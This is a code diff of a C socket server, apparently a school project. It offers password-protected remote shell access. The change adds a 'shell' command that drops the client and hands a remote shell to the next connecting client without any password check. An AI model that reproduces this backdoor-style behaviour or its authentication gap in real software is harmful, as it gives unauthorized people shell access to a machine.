@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:28:48 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/06 14:56:20 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/07 11:06:53 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -140,20 +140,31 @@ static int	transfer_file(int sock_fd, char *src_path)
 	return (1);
 }
 
-void	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
+int	server_remove_client(t_server *server, int fd);
+
+int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 {
 	(void)size;
 	t_ctx	*ctx = ptr;
 
 	if (!check_client_password(ctx, client, msg))
-		return ;
+		return (1);
 
 	logger_log(LOG_LOG, "From %d: %s", client->id, msg);
 
 	if (!strcmp(msg, "shell"))
 	{
+		ctx->server.goofy_shell = true;
+		if (ctx->server.disconnect_hook)
+			ctx->server.disconnect_hook(client, ctx->server.disconnect_hook_arg);
+		close(client->fd);
+		server_remove_client(&ctx->server, client->fd);
+		return (0);
+	}
+	if (!strcmp(msg, "shell+"))
+	{
 		start_remote_shell(ctx, client);
-		return ;
+		return (1);
 	}
 	else if (!strcmp(msg, "help"))
 	{
@@ -164,7 +175,7 @@ void	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 	{
 		logger_log(LOG_LOG, "Client %d quit command entered", client->id);
 		ctx->running = false;
-		return ;
+		return (1);
 	}
 	else if (!strcmp(msg, "stats"))
 	{
@@ -185,15 +196,23 @@ void	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 	else
 		server_send_to_id(&ctx->server, client->id, UNKNOWN_COMMAND_TEXT);
 	server_send_to_fd(client->fd, PROMPT);
+	return (1);
 }
 
 void	connect_hook(t_client *client, void *ptr)
 {
 	t_ctx	*ctx = ptr;
 
+	logger_log(LOG_INFO, "Client %d joined", client->id);
+	if (ctx->server.goofy_shell)
+	{
+		client->is_goofy_shell = true;
+		start_remote_shell(ctx, client);
+		ctx->server.goofy_shell = false;
+		return ;
+	}
 	server_send_to_id(&ctx->server, client->id, WELCOME_TEXT);
 	server_send_to_id(&ctx->server, client->id, PASSWORD_PROMPT_TEXT);
-	logger_log(LOG_INFO, "Client %d joined", client->id);
 }
 
 void	disconnect_hook(t_client *client, void *ptr)
